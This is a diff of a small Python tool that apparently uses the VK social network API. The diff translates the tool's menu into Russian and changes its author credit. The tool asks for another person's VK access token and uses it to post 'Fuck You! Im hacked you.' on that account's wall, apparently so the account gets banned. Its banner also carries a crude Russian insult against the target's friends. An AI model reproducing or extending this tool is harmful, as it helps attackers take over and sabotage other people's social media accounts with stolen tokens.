@@ -13,21 +13,21 @@ def fastban():
   |  _/ ___ \ ___) || |____| |_) / ___ \| |\  |
   |_|/_/   \_\____/ |_|    |____/_/   \_\_| \_|
 \033[0m
-      .:Coding-Lab:. .:|ТВОИМ ДРУЗЬЯМ ПИЗДА!!!|:.
+      .:Модернизировано Drag228228:. .:|ТВОИМ ДРУЗЬЯМ ПИЗДА!!!|:.
 
 '''
     print(Fore.RED + "\033[1m" + intro)
     print(Fore.WHITE + """                                  
-[1] WALL-POST-BAN                        
-[2] DEVOLOPERS                          
-[3] EXIT                                 
+[1] Бан с помощью поста                        
+[2] Создатели (оригинальные)                          
+[3] Выход                                
 
 
     """)
-    a = input("[Enter number] -> ")
+    a = input("[Номер] -> ")
     if a == "1":
         try:
-            tok = input("[ACCESS-TOKEN] -> ") 
+            tok = input("[Токер дауна] -> ") 
             token = vk_api.VkApi(token = tok) 
             vk = token.get_api()
             vk.wall.post(message='Fuck You! Im hacked you.')
@@ -43,7 +43,7 @@ def fastban():
             fastban()
     if a == "2":
         print("""                                  
- DEVOLOPERS                               
+ Создатели                               
  TELEGRAM: @cod1ng_lab                    
  TELEGRAM: @BatyaRimskiy1                  
  Для выхода в главное меню нажмите Enter   
